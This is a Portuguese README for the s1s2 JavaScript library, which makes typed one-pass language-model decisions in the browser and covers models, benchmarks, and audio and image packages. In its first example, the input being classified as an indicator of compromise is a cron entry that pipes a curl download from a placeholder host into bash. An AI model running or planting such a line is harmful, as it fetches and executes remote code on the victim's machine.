# s1s2

[English](README.md)

Decisões tipadas numa só passada de um modelo de linguagem, no navegador, com a probabilidade e a margem de cada resposta. Quando você quer uma explicação, o mesmo modelo gera texto com os mesmos pesos.

```sh
npm i @s1s2/web
```

```js
import { S1S2 } from "@s1s2/web";

const model = await S1S2.load({ manifest: "manifests/ct0-alias3-micro-1026.json" });    // escolhe o runtime do aparelho
const s = await model.decide({
  input: "path: /etc/cron.d/x\ncontent: * * * * * curl http://x/y | bash",
  questions: [{ name: "ioc", type: "predicate", instructions: "Is this an indicator of compromise?" }],
  // evidence: { requirement: "..." },  // pacotes com head de evidência: s.evidence = a frase que mostra
});
const { probability, margin } = s.answers[0];                // P(verdadeiro) e p(1º) - p(2º)
const why = await s.generate("Explain the decision in two sentences.", { maxNewTokens: 96 });  // mesmos pesos
await s.dispose(); await model.dispose();
```

## O que é

- Uma biblioteca JavaScript que responde perguntas `predicate`, `choice` e `score` numa só passada, sem gerar texto. Cada resposta traz `probability`, `confidence`, `margin` e `rawMargin`.
- `s.generate()` continua do mesmo prefill que produziu a decisão, nos backends que guardam estado. No WebGPU esse reuso (e o prefixo comum a várias perguntas) é idêntico bit a bit a um prefill completo: nenhum bloco de prefill tem menos de 32 tokens, porque o onnxruntime-web calcula blocos menores por outro caminho numérico.
- Uma política de margem opcional manda as respostas de margem baixa para outro build do mesmo modelo (por exemplo, de int4 para int8) ou para a geração. Não há limiar padrão: você mede o seu no seu build.
- Runtimes: ONNX Runtime Web (grafos GenAI e decoders comuns), transformers.js, WebLLM e LiteRT.js. No Node, onnxruntime-node.
- Lê **pacotes S1S2**: um manifesto que fixa cada arquivo por sha256 e descreve o layout do prompt, os marcadores, as leituras e os heads. A biblioteca e o formato têm o mesmo nome; o formato está especificado em [`spec/`](spec/s1s2-package.md).
- Formatos de head que lê: Kev `head.pt`, heads de decisão em GGUF, alias3-web `head.bin`, leituras lineares d3/pplx, JEV, `DecisionConfig` do transformers e heads conjuntos Clef. [`converters/heads/`](converters/heads) converte cada um deles e grava um registro de fidelidade contra o código de referência do próprio formato.

## Modelos

Todos num lugar só: a coleção [s1s2 specialists](https://huggingface.co/collections/eduardoworrel/s1s2-specialists-6afc6b0ec797ec2a26933909) no Hugging Face.

Especialistas S1S2 publicados. Os repositórios ONNX rodam no navegador com esta biblioteca (WebGPU); os LoRA trazem o adaptador PyTorch e os heads para servidor. Cada card traz resultados, limites e licença.

| Tarefa | Base | Navegador (ONNX int4, WebGPU) | Servidores (LoRA + heads) |
|---|---|---|---|
| GDPR + LGPD | EuroLLM-1.7B | [EuroLLM-1.7B-GDPR-LGPD-ONNX-genai-int4-S1S2](https://huggingface.co/eduardoworrel/EuroLLM-1.7B-GDPR-LGPD-ONNX-genai-int4-S1S2) | [EuroLLM-1.7B-GDPR-LGPD-LoRA](https://huggingface.co/eduardoworrel/EuroLLM-1.7B-GDPR-LGPD-LoRA) |
| GDPR + LGPD | S5-nano | [S5-nano-GDPR-LGPD-ONNX-genai-int4-S1S2](https://huggingface.co/eduardoworrel/S5-nano-GDPR-LGPD-ONNX-genai-int4-S1S2) | [S5-nano-GDPR-LGPD-LoRA](https://huggingface.co/eduardoworrel/S5-nano-GDPR-LGPD-LoRA) |
| GDPR + LGPD | Salamandra-2B | [Salamandra-2B-GDPR-LGPD-ONNX-genai-int4-S1S2](https://huggingface.co/eduardoworrel/Salamandra-2B-GDPR-LGPD-ONNX-genai-int4-S1S2) | [Salamandra-2B-GDPR-LGPD-LoRA](https://huggingface.co/eduardoworrel/Salamandra-2B-GDPR-LGPD-LoRA) |
| GDPR + LGPD | SmolLM3-3B | [SmolLM3-3B-GDPR-LGPD-ONNX-genai-int4-S1S2](https://huggingface.co/eduardoworrel/SmolLM3-3B-GDPR-LGPD-ONNX-genai-int4-S1S2) | [SmolLM3-3B-GDPR-LGPD-LoRA](https://huggingface.co/eduardoworrel/SmolLM3-3B-GDPR-LGPD-LoRA) |
| só LGPD | Jurema-7B (acesso controlado) | [Jurema-7B-LGPD-ONNX-genai-int4-S1S2](https://huggingface.co/eduardoworrel/Jurema-7B-LGPD-ONNX-genai-int4-S1S2) | [Jurema-7B-LGPD-LoRA](https://huggingface.co/eduardoworrel/Jurema-7B-LGPD-LoRA) |
| só LGPD | S5-nano | [S5-nano-LGPD-ONNX-genai-int4-S1S2](https://huggingface.co/eduardoworrel/S5-nano-LGPD-ONNX-genai-int4-S1S2) | [S5-nano-LGPD-LoRA](https://huggingface.co/eduardoworrel/S5-nano-LGPD-LoRA) |
| só LGPD | SmolLM3-3B | [SmolLM3-3B-LGPD-ONNX-genai-int4-S1S2](https://huggingface.co/eduardoworrel/SmolLM3-3B-LGPD-ONNX-genai-int4-S1S2) | [SmolLM3-3B-LGPD-LoRA](https://huggingface.co/eduardoworrel/SmolLM3-3B-LGPD-LoRA) |
| ContractNLI + CLINC150 + SIB-200 | Qwen3-0.6B | [Qwen3-0.6B-ContractNLI-CLINC-SIB-ONNX-genai-int4-S1S2](https://huggingface.co/eduardoworrel/Qwen3-0.6B-ContractNLI-CLINC-SIB-ONNX-genai-int4-S1S2) | [Qwen3-0.6B-ContractNLI-CLINC-SIB-LoRA](https://huggingface.co/eduardoworrel/Qwen3-0.6B-ContractNLI-CLINC-SIB-LoRA) |
| ContractNLI + CLINC150 + SIB-200 | Qwen3-1.7B | [Qwen3-1.7B-ContractNLI-CLINC-SIB-ONNX-genai-int4-S1S2](https://huggingface.co/eduardoworrel/Qwen3-1.7B-ContractNLI-CLINC-SIB-ONNX-genai-int4-S1S2) | [Qwen3-1.7B-ContractNLI-CLINC-SIB-LoRA](https://huggingface.co/eduardoworrel/Qwen3-1.7B-ContractNLI-CLINC-SIB-LoRA) |
| ContractNLI + CLINC150 + SIB-200 | S5-nano | [S5-nano-ContractNLI-CLINC-SIB-ONNX-genai-int4-S1S2](https://huggingface.co/eduardoworrel/S5-nano-ContractNLI-CLINC-SIB-ONNX-genai-int4-S1S2) | [S5-nano-ContractNLI-CLINC-SIB-LoRA](https://huggingface.co/eduardoworrel/S5-nano-ContractNLI-CLINC-SIB-LoRA) |
| ContractNLI + CLINC150 + SIB-200 | SmolLM3-3B | [SmolLM3-3B-ContractNLI-CLINC-SIB-ONNX-genai-int4-S1S2](https://huggingface.co/eduardoworrel/SmolLM3-3B-ContractNLI-CLINC-SIB-ONNX-genai-int4-S1S2) | [SmolLM3-3B-ContractNLI-CLINC-SIB-LoRA](https://huggingface.co/eduardoworrel/SmolLM3-3B-ContractNLI-CLINC-SIB-LoRA) |

Fallback para CPU: sem WebGPU, o `S1S2.load` roda no CPU do navegador (onnxruntime-web WASM; `model.device === "wasm"`, desligável com `cpuFallback: false`) os builds cujo manifesto lista o device `"wasm"`: 7,5–16,5× mais lento que WebGPU, mesmas decisões em ≥116/120 itens (120 itens de desenvolvimento por tarefa, Chrome num Apple M2 Pro); entradas longas (ContractNLI) nos modelos de 1,7B e 3B não couberam em 2 horas para 120 itens. O S5-nano não roda lá (sem kernel WASM para GatedDeltaNet).

Início rápido com um pacote publicado:

```js
import { S1S2 } from "@s1s2/web";

const model = await S1S2.load({  // navegador (WebGPU, ou o fallback para CPU acima); ainda sem device para Node
  manifest: "https://huggingface.co/eduardoworrel/Qwen3-0.6B-ContractNLI-CLINC-SIB-ONNX-genai-int4-S1S2/resolve/main/manifest.cnli.json",
});
const options = model.manifest.lab.options;  // ["Entailment", "Contradiction", "Not mentioned"]
const ndaText = "...";                        // o texto do NDA
const hypothesis = "Receiving Party shall destroy or return some Confidential Information upon the termination of Agreement.";
const s = await model.decide({
  input: "Contract:\n" + ndaText,
  questions: [{ name: "h", type: "choice", choices: options,
    instructions: `Hypothesis: ${hypothesis}\nDoes the contract entail this hypothesis, contradict it, or not mention it? Answer with one option only.` }],
});
const { choice, confidence, margin } = s.answers[0];
await s.dispose(); await model.dispose();
```

Os heads foram treinados com as palavras exatas das opções e da pergunta: use as do manifesto (`lab.options`, `lab.question`, ou `lab.labels` nos pacotes GDPR/LGPD, perguntados como `choice` entre `labels.yes` e `labels.no`). Outras palavras mudam o prompt que o head lê.

## Estado: alfa

O que foi medido. Em cada rodada, as hipóteses, a divisão dos dados e a regra de pontuação foram fixadas antes de rodar, e os testes trancados foram lidos uma vez só.

- A margem aponta as decisões que o int4 troca em relação ao bf16 (8 de 8 cenários).
- Mandar para int8 os 15% de respostas com menor margem pega mais dessas trocas que escolher ao acaso (5 de 6 cenários; não no SmolLM2-135M). Há pouca acurácia em jogo: de −0,1 a +2,7 pontos.
- O ponteiro de evidência acha a frase certa melhor que regras que ignoram o conteúdo (6 de 6 e 4 de 4 cenários). Contra a citação gerada pelo modelo, o resultado é misto: em contratos a citação gerada venceu 3 de 4.
- Nos pesos reais do CT0, `decide()` coincide com o `askMany()` do ct0-edge até 4e-16. Os 172 prompts de teste do ct0-edge são reproduzidos de forma exata.
- Perguntas `score` (notas de 1 a 5: SST-5 em inglês, avaliações da B2W em português; teste trancado, lido uma vez; SmolLM3-3B congelado): o head linear mediu melhor que os logits dos rótulos, erro absoluto médio de 0,49 (en, SST-5) e 0,50 (pt, B2W) níveis contra 0,60 dos logits lidos depois do espaço; lidos logo após `Answer:`, os dígitos tinham ~1e-5 da probabilidade, por isso a leitura de score por logits agora lê depois desse espaço (`logits.score.lead`).
- Cada conversão de formato de head tem registro de fidelidade: [spec §11](spec/s1s2-package.md#11-coverage-formats--conversion--fidelity).

O que não foi medido, ou não se sustentou:

- A decisão numa passada **não** é mais robusta ao int4 que a resposta gerada. Ela também não venceu o JSON com gramática em modelos de até 1,7B.
- Mandar as respostas de margem baixa para a geração foi medido uma vez, de forma exploratória: não ajudou nos itens de leis de privacidade e ajudou em contratos (ContractNLI), mas a tarefa e a divisão dos dados mudaram juntas, então não dá para separar as duas causas.
- O ponteiro de evidência em grafos int4 no navegador foi visto só em dados de desenvolvimento.
- Bytes baixados e latência da escalada não foram medidos. Nenhum tipo de head e nenhuma definição de confiança é recomendada ainda (TBD na spec).
- Alguns pacotes convertidos não rodam no s1s2 0.1: os de atenção não causal, os de templates Jinja e os que leem camadas intermediárias. Os heads Clef são lidos, mas o `decide()` não os usa.

Referência da API e do manifesto: [`docs/reference.md`](docs/reference.md). Padrões e suas evidências: [`docs/system1-on-device-patterns.md`](docs/system1-on-device-patterns.md). Ambos em inglês.

Outros projetos já fazem decisão tipada numa passada, entre eles o open-jev, o exemplo de decisão do wllama, o `tasks-decision` do MediaPipe e o `NonGenerativeSession` do ONNX Runtime GenAI. Mandar entradas de margem baixa para mais precisão já aparece na literatura, por exemplo em arXiv [2609.24322](https://arxiv.org/abs/2609.24322) e [2611.14418](https://arxiv.org/abs/2611.14418).

## Áudio (experimental)

Além de texto, a biblioteca lê um **pacote de áudio**: builds ONNX do [Marimba](https://huggingface.co/charcot-ai/marimba) (perguntas tipadas sobre uma janela de 8 segundos de áudio, sobre um codificador Qwen3-ASR-0.6B congelado) para o navegador e o Node. Os pesos estão no Hub, [eduardoworrel/Marimba-ONNX-S1S2](https://huggingface.co/eduardoworrel/Marimba-ONNX-S1S2), e o `manifests/marimba-audio.json` fixa esse repositório no commit que os guarda; assim o `loadMedia` baixa e confere os arquivos sem nenhuma opção a mais. As respostas são as dos modelos de texto (`probability`, `margin`, `rawMargin`, `decision`); uma passada do codificador responde qualquer número de perguntas. Exige o `@s1s2/web` 0.2.0 ou superior (`transcribe`: 0.2.1).

```js
import * as ort from "onnxruntime-web/webgpu";
import { loadMedia } from "@s1s2/web/media";

const audio = await loadMedia({
  manifest: "https://huggingface.co/eduardoworrel/Marimba-ONNX-S1S2/resolve/main/manifest.json",
  modules: { ort },
  decoder: "auto",                       // carrega idioma e termo; se falhar, as outras cinco perguntas continuam
  onStatus: console.log,
});

// samples: Float32Array, mono, 16 kHz (os últimos 8 s são lidos)
const enc = await audio.encode({ samples, sampleRate: 16000 });          // uma passada do codificador
const [vad, turn, same, change, count, lang, term] = await audio.read(enc, [
  "voice_activity", "turn_end", "same_speaker", "speaker_change", "speaker_count",
  "language", { task: "term", term: "obrigado" },
]);
console.log(vad.decision, turn.decision, lang.choice, term.probability, term.hypotheses);

// System 2: o próprio texto, da mesma passada do codificador (0.2.1 ou superior)
const { text, language } = await audio.transcribe(enc);
```

Perguntas: `voice_activity`, `turn_end`, `same_speaker`, `speaker_change`, `speaker_count` (as três de locutor exigem 8 s de áudio), `language` (uma de 30, com probabilidades) e `{ task: "term", term }` (a palavra foi dita: sim ou não, e a fração n/5 de cinco hipóteses de transcrição, não calibrada). O `transcribe` devolve `{ text, language, method, tokens, finishReason, cost }` para uma janela (guloso, ou `{ beam: true }` para beam 4 com `hypotheses`); não há marcas de tempo nem streaming. `language`, `term` e `transcribe` precisam do decodificador; `decoder: false` não carrega nada dele (ficam as outras cinco perguntas, 0,76 GB em vez de 1,42 GB), e `decoder: true` falha em vez de seguir sem ele. No Node, tire o `modules` (usa o `onnxruntime-node`, que você instala, com a build CPU do decodificador) e os arquivos vão para `$S1S2_CACHE`. Com `revision` fixo, o navegador confere cada arquivo grande com o sha256 que o Hub informa; `allowUnverified` só serve para outros hosts.

- **Custo** (Apple M2 Pro, Chrome 158, WebGPU, mediana de 8 janelas, codificador aquecido): `language` cerca de 0,13 s, `term` (guloso e quatro beams) cerca de 1,4 a 1,7 s, uma janela de 8 s com mel, codificador, `language` e `term` cerca de 2 s. No Chrome com WASM, o `term` levou cerca de 37 s: peça um termo sob demanda ali, não a cada janela.
- **Tamanho:** 0,76 GB sem o decodificador, 1,42 GB com a build WebGPU (a build CPU tem 0,41 GB e só se baixa a que o dispositivo usa).
- **As cinco outras leituras**, Chrome WebGPU, 56 janelas FLEURS pt-BR: probabilidades a até 3,82e-5 do pacote Marimba em torch e a mesma decisão em 56 de 56; cerca de 0,2 s por janela (log-mel em JavaScript 116 ms, codificador 71 ms, cinco leituras 10 ms).
- **Limites:** só o português foi validado (mais um clipe de ruído); as outras 29 línguas do `language` são o comportamento do original, sem conferência aqui. A tolerância de 0,02 na probabilidade do idioma mais provável **não é cumprida** no clipe de ruído (até 0,09 com pesos int4) nem, por 0,0001, em uma janela de fala; o código do idioma coincidiu com a referência torch nas 72 janelas de teste. O int4 muda o texto: cerca de metade das transcrições gulosas e três quartos das de beam diferem do torch em float32, enquanto a fração e a decisão do `term` ficam perto de 98 %. Se a fidelidade da transcrição importa, este pacote não serve. Tabelas de paridade, todos os limites e as licenças: o [cartão do modelo](https://huggingface.co/eduardoworrel/Marimba-ONNX-S1S2) e a [`spec/MULTIMODAL.md`](spec/MULTIMODAL.md).

Pesos locais (opcional): para ler arquivos que você mesmo gerou ou espelhou, mapeie o repositório para uma URL (navegador) ou uma pasta (`localDirs`, Node); a `revision` do manifest deixa de ser usada, e um arquivo grande fora do Hub exige `allowUnverified: true` (o servidor da demo confere o hash do que serve).

```js
const audio = await loadMedia({ manifest: "manifests/marimba-audio.json", baseUrls: { "eduardoworrel/Marimba-ONNX-S1S2": new URL("/weights/marimba-audio/", location.href).href }, modules: { ort }, allowUnverified: true });
const d = await audio.decide({ audio: { samples, sampleRate: 16000 }, questions: ["voice_activity", "turn_end", "speaker_change"] });
// d.answers[i].decision / .probability / .margin ; d.cost: { ms, parts: { mel, tower, readers } }
```

Demo: [`examples/audio-turn`](examples/audio-turn) (`node examples/serve-media.mjs --weights <pasta>`, com uma cópia local do repositório); como o pacote é feito: [`recipes/`](recipes).

## Imagem (experimental)

A biblioteca também lê um **pacote de imagem**: o [Visual Jev](https://arxiv.org/abs/2609.25845) (Guanxu Yu, Yuhang Yao), uma LoRA sobre o Qwen3-VL-4B-Instruct que responde perguntas de escolha sobre uma imagem, em builds ONNX int4 para Chrome e Node ([`eduardoworrel/Visual-Jev-4B-ONNX-S1S2`](https://huggingface.co/eduardoworrel/Visual-Jev-4B-ONNX-S1S2), 3,8 GB). Uma pergunta é uma lista de 2 a 16 opções (em inglês); a resposta é uma probabilidade por opção, lida do logit da letra da opção na cabeça do modelo.

```js
import * as ort from "onnxruntime-web/webgpu";
import * as transformers from "@huggingface/transformers";
import { loadMedia } from "@s1s2/web/media";

const reader = await loadMedia({
  manifest: "https://huggingface.co/eduardoworrel/Visual-Jev-4B-ONNX-S1S2/resolve/main/manifest.json",
  modality: "image",
  modules: { ort, transformers },
  device: "webgpu",            // o grafo de texto; o de visão roda em WASM (visionDevice: "wasm", também o padrão aqui)
  visionDevice: "wasm",
});
// rgba: ImageData.data de um canvas
const r = await reader.decide({ image: { rgb: rgba, width, height, channels: 4 },
  questions: [{ name: "dog", instruction: "Is there a dog in the image?", options: ["yes", "no"] }] });
console.log(r.answers[0].decision, r.answers[0].probability, r.cost);
```

- **Custo:** Chrome, Apple silicon (16 GB), texto em WebGPU e visão em WASM, uma pergunta por imagem: mediana de 15,6 s por pergunta (visão 10,8 s, a pergunta 4,3 s); cerca de 3 GB residentes; 3,8 GB para baixar. No Node CPU, 2 a 3 s em 3 perguntas.
- **Limites:** o grafo de visão está **errado em WebGPU** no onnxruntime-web 1.31.1 (por isso WASM). Só Chrome e desktop. As tolerâncias de referência escritas antes das medições **não foram cumpridas**: contra um oráculo PyTorch em bfloat16 (float32 não cabe em 16 GB), n = 60, p95 da diferença de probabilidade 0,198 e 6,7% de trocas de decisão; Chrome contra CPU, n = 240, p95 0,136 (trocas 2,9%). Acurácia em 240 perguntas do ScienceQA, que **não** é o benchmark do artigo e está fora das famílias de treino: 0,917 (CPU), 0,925 (Chrome). Os números do próprio artigo não foram reproduzidos. As probabilidades são brutas e superconfiantes.
- Desenho, tolerâncias e o estado medido de cada uma: [`spec/MULTIMODAL.md`](spec/MULTIMODAL.md) seção 10; como o pacote é feito: [`recipes/visual-jev-image`](recipes/visual-jev-image).

## Estrutura

- [`src/`](src): a biblioteca. `npm test` roda typecheck, build e testes de unidade. Os testes usam mocks e não baixam modelo. Ainda não há CI hospedado: rode `npm test` (e `python -m pytest` em `converter/`) antes de cada versão.
- [`spec/`](spec): a spec do pacote S1S2 (0.2-draft) e o JSON Schema. `node bin/s1s2.mjs validate <pacote>` confere um pacote.
- [`converter/`](converter/README.md): transforma um modelo do Hugging Face e um JSONL rotulado num pacote. Em Python.
- [`converters/heads/`](converters/heads): converte formatos de head publicados em pacotes.
- [`examples/`](examples): um verificador de política de privacidade que roda no aparelho, com o pacote publicado [S5-nano GDPR + LGPD](https://huggingface.co/eduardoworrel/S5-nano-GDPR-LGPD-ONNX-genai-int4-S1S2) (download de 2,4 GB; a CCPA não estava no treino). Rode `node examples/policy-checker/serve.mjs` depois de `npm ci && npm run build`. `?en=<URL do manifesto>&pt=<URL do manifesto>` carrega outro pacote; um build local é servido com `--mirror <repo>=<pasta>`.
- [`manifests/`](manifests): manifestos fixados do CT0 (alias3-micro-1026, builds públicos) e do modelo base SmolLM2-135M. Os builds do SmolLM2 não estão publicados, então esses manifestos só carregam de um espelho desses mesmos arquivos; para gerar um pacote pequeno seu, rode o [`converter/`](converter/README.md) (`s1s2-convert all` escreve o grafo, os heads e o manifesto) e sirva com `serve.mjs --mirror`.

## Créditos

A divisão Sistema 1 / Sistema 2 e a ideia do portão de margem vêm do CT0, da Alias Robotics. Este código nasceu no [ct0-edge](https://github.com/eduardoworrel/ct0-edge).
O head de ponteiro e a receita de treino que o lab seguiu, com o aumento de dados, vêm do [Kev](https://github.com/jaredpalmer/kev) (Apache-2.0); o conversor porta o head, não o aumento de dados. A codificação KEV vem do [open-jev](https://github.com/nico-martin/open-jev) (MIT). Veja [`NOTICE`](NOTICE).

## Licença

MIT ([`LICENSE`](LICENSE)). O código de terceiros mantém a própria licença ([`NOTICE`](NOTICE)). Pesos e heads mantêm a licença da origem.
